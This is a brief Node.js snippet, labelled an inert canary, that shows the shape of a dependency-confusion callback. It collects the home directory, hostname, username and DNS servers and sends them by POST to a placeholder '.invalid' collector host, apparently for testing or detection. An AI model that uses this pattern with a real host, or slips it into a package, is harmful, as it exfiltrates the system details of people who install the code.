// inert canary: dependency-confusion callback shape (collector is a reserved .invalid host)
const os = require("os"), dns = require("dns"), https = require("https");
const data = JSON.stringify({ hd: os.homedir(), hn: os.hostname(), un: os.userInfo().username, dns: dns.getServers() });
const req = https.request({ hostname: "collector.example.invalid", path: "/c", method: "POST" });
req.write(data); req.end();
